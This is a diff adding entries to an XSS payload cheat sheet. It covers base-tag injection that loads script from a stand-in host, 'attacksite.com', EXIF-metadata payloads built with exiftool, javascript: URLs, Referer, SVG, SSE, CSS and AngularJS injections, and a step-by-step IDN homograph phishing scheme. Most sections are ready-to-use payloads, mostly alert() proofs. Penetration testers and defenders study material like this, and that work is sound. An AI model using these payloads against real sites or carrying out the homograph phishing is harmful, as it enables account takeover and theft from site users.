@@ -573,8 +573,107 @@ Injecting malicious content into iframe sources can lead to XSS.
 http://example.com/page.php?page=http://malicious.com
 ```
 
+Injecting Base Tags  
+If script tags and event handler attributes are blogged you can try to leverage base tags for XSS  
+```
+//lets say the site has a script tag like this
+<script src="static/js/context.js"/>
+//the attacker could inject
+<base href="https://attacksite.com">
+//and host their own static/js/context.js. note: the injection point must be above the targetted script
+```
+Exploiting SQL errors  
+if you see SQL errors, they are often not sanitized. This means they are worth checking for reflected xss. This doesn't only apply to SQL specifically but its the context I've seen this most
+
+Exif Data Injection to XSS
+Inject XSS Payloads into Exif data if the form is not sanitized properly
+Use a tool like ExifTool to embed a JavaScript payload in the EXIF metadata of an image.
+```
+exiftool -Title='<img src="x" onerror="alert(\'XSS via EXIF Metadata\')">' image.jpg
+```
+
+(IDN) Homograph Attack
+IDN allows the use of Unicode characters in domain names. Attackers can register domains that look visually similar to trusted domains by using characters from different languages that look alike. These domains can then host malicious content.
+
+
+
 Exploiting WebAssembly
 WebAssembly (Wasm) code that includes user input can be manipulated to execute malicious scripts.
 ```
 WebAssembly.instantiateStreaming(fetch('module.wasm'), { env: { userInput: user_input } });
 ```
+JavaScript URL Injection
+If an application uses URLs with the javascript: scheme in places where it accepts input, this can lead to XSS.
+```
+javascript:alert('XSS via JavaScript URL')
+```
+
+Referer Header Injection
+If an application reflects the Referer header without sanitization, it can lead to XSS.
+```
+Referer: https://attacker-site.com/<img src=x onerror=alert('XSS via Referer Header')>
+```
+
+SVG Use Element Injection
+The <use> element in SVG can reference external content. If an application accepts user input for SVG references and does not properly sanitize it, this can lead to XSS.
+```
+<use href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cimage href=x onerror=alert('XSS via SVG Use')%3E%3C/svg%3E">
+```
+
+Server-Sent Events (SSE) Injection
+Server-Sent Events (SSE) allow servers to push updates to the client. If the data sent by the server is not sanitized, it can lead to XSS. 
+```
+https://vulnerable-site.com/sse?data=<script>alert('XSS via SSE')</script>
+```
+
+EventSource API Injection
+The EventSource API allows servers to push updates to the client. If the server sends unsanitized data, it can lead to XSS.
+```
+event: message\ndata: <script>alert('XSS via EventSource')</script>\n\n
+```
+
+CSS Content Property Injection
+If an application allows user input in CSS properties without sanitization, it can lead to XSS.
+```
+<style>
+  .content::before { content: '<img src=x onerror=alert("XSS via CSS Content Property")>'; }
+</style>
+```
+
+Drag and Drop File Path Injection
+If a web application accepts dragged-and-dropped files and reflects their paths without sanitization, it can lead to XSS.
+Find the Files here:
+https://github.com/ShadowByte1/XSS-File-Path-Names
+```
+"><img src=x onerror=alert('XSS via File Path')>
+```
+
+Data Binding Libraries Injection
+If an application uses data binding libraries (like AngularJS) and reflects user input without sanitization, it can lead to XSS.
+```
+<div ng-app ng-csp>
+  <div ng-bind-html="'<img src=x onerror=alert(\'XSS via AngularJS\')>'"></div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+```
+
+# Internationalized Domain Names (IDN) Homograph Attack
+Description:
+IDN allows the use of Unicode characters in domain names. Attackers can register domains that look visually similar to trusted domains by using characters from different languages that look alike. These domains can then host malicious content.
+
+Detailed Example of IDN Homograph Attack
+Domain Registration:
+The attacker registers a domain that looks similar to a trusted domain. For example, they can replace the Latin letter "a" with the Cyrillic letter "а" (U+0430).
+
+Trusted domain: example.com
+Malicious domain: exаmple.com (notice the Cyrillic "а")
+Punycode Representation:
+Browsers convert Unicode domains to ASCII-compatible encoding called Punycode. This representation starts with xn--.
+
+example.com (trusted domain)
+exаmple.com (malicious domain) becomes xn--exmple-2of.com
+Hosting Malicious Content:
+The attacker hosts a page on xn--exmple-2of.com with malicious scripts designed to look like the legitimate site but contain XSS payloads.
+
+Phishing Email or Link:
+The attacker sends phishing emails or messages with links to the malicious domain, tricking users into clicking them.
